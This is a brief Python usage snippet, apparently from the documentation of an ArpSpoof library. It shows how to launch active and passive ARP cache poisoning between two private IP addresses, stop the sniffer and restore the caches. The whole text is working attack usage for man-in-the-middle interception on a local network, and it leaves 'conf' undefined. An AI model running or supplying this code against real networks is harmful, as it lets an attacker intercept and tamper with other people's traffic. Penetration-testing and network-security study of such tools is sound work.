from ArpSpoof import SpooferARP

spoofer = SpooferARP('10.110.0.10', '10.110.0.4')
spoofer.active_cache_poisonning()

spoofer = SpooferARP('10.110.0.10', '10.110.0.4', conf.iface, False, 0.5)
spoofer.passive_cache_poisonning(asynchronous=True)
spoofer.run = False
spoofer.sniffer.stop()                                   # only with asynchronous mode
spoofer.restore()              